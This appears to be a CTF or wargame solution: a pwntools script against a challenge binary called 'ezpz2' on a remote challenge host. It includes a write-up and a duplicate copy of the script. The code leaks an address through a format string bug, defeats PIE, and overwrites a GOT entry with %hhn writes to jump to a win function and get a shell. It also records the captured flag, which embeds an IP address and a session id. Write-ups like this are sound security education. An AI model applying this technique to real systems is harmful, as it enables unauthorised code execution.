from pwn import *

#flag is FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoibWlkc2VtLW1pZHNlbTMiLCJpcCI6IjIyMC4yNDAuNjYuMTUzIiwic2Vzc2lvbiI6IjYzNDAxMjY2LWFkZDEtNDQ1NC1iZWYxLWYzZWI3YzZkNzQ0ZiJ9.adxWPUYW5DqsNvZRuC5DtymV6PEKpfQDxiPy3dwWsTk}

# my premade functions from wargame4 to generate format string payloads
def get_n(new, prev, size):
	while new <= prev:
		new += (1 << size)
	return new-prev

def gen_addrs(base_addr):
	addrs = b''
	for i in range(4):
		addrs += p32(base_addr + i)
	return addrs

def gen_format_writes(to_write, setup_len, stack_offset):
	payload = b''
	n_val = [setup_len]
	for i in range(4):
		n_val += [get_n(to_write[i], sum(n_val[:i+1]), 8)]
		payload += '%{}c'.format(n_val[i+1]).encode()
		payload += '%{}$hhn'.format(stack_offset + i).encode()
	return payload

p = remote('plsdonthaq.me', 24104)
#p = process('./ezpz2')

p.recvuntil('(or press enter to refresh): ')
p.sendline('U')
p.recvuntil('Chuck us some bytes (max 255): ')
p.sendline('%x')
p.recvuntil('(or press enter to refresh): ')
p.sendline('P')
p.recvline()
#ebx is constant 0x35f0 which is the GOT start
ebx_0x1b0 = int('0x' + p.recvline().rstrip().decode(), 16)
ebx = ebx_0x1b0 - 0x1b0
# win addr is at offset 0x1369 within the binary
win_addr = ebx - 0x35f0 + 0x1369
win_addr = [c for c in p32(win_addr)]
printf_addr = ebx + 0x24
print(ebx_0x1b0, win_addr)
p.recvuntil('(or press enter to refresh): ')

p.sendline('U')
p.recvuntil('Chuck us some bytes (max 255): ')

payload = b'AAA'
payload += gen_addrs(printf_addr)
setup_len = len(payload)
payload += gen_format_writes(win_addr, setup_len, 5)

p.sendline(payload)

p.recvuntil('(or press enter to refresh): ')
p.sendline('P')

p.interactive()

'''
General overview of problems faced
-------------------------------------
- This is similar to ezpz except this time there is PIE and we must leak an address with print_flag
- We set the buffer to %x in underflow, then in print_flag it prints this with a vulnerable printf()
- The first element that gets printed is the address of the string buffer which is at ebx+1b0 where ebx is the GOT relative address 0x35f0
- So subtract 1b0 to get ebx. Subtract 0x35f0 to get base address of the binary. Add 0x1369 to get the address of win() (since this is win's offset in the binary)
- Unlike in ezpz, the buffer in overflow is larger than the string_buffer so no overflowing here.
- Theres no RELRO (from checksec) so we can overwrite GOT
- Initially I aimed to overwrite printf GOT entry (ebx+0x10) but this resulted in a 00 within the address.
- In my payload this would get interpreted as a null byte and make the strcpy in print_flag skip my payload.
- So instead I overwrote puts (ebx+0x24) which resulted in no null byte
- For a 4 byte alignment I needed AAA in my payload then I could use %hhn starting from stack offset 5 (found by manual trialling)
- Once this payload is entered in the underflow function, entering print_flag executes it and then instead of jumping to puts it jumps to win and we get a shell

Script/Command used
------------------
```
from pwn import *

# my premade functions from wargame4 to generate format string payloads
def get_n(new, prev, size):
	while new <= prev:
		new += (1 << size)
	return new-prev

def gen_addrs(base_addr):
	addrs = b''
	for i in range(4):
		addrs += p32(base_addr + i)
	return addrs

def gen_format_writes(to_write, setup_len, stack_offset):
	payload = b''
	n_val = [setup_len]
	for i in range(4):
		n_val += [get_n(to_write[i], sum(n_val[:i+1]), 8)]
		payload += '%{}c'.format(n_val[i+1]).encode()
		payload += '%{}$hhn'.format(stack_offset + i).encode()
	return payload

p = remote('plsdonthaq.me', 24104)
#p = process('./ezpz2')

p.recvuntil('(or press enter to refresh): ')
p.sendline('U')
p.recvuntil('Chuck us some bytes (max 255): ')
p.sendline('%x')
p.recvuntil('(or press enter to refresh): ')
p.sendline('P')
p.recvline()
#ebx is constant 0x35f0 which is the GOT start
ebx_0x1b0 = int('0x' + p.recvline().rstrip().decode(), 16)
ebx = ebx_0x1b0 - 0x1b0
# win addr is at offset 0x1369 within the binary
win_addr = ebx - 0x35f0 + 0x1369
win_addr = [c for c in p32(win_addr)]
printf_addr = ebx + 0x24
print(ebx_0x1b0, win_addr)
p.recvuntil('(or press enter to refresh): ')

p.sendline('U')
p.recvuntil('Chuck us some bytes (max 255): ')

payload = b'AAA'
payload += gen_addrs(printf_addr)
setup_len = len(payload)
payload += gen_format_writes(win_addr, setup_len, 5)

p.sendline(payload)

p.recvuntil('(or press enter to refresh): ')
p.sendline('P')

p.interactive()
```
'''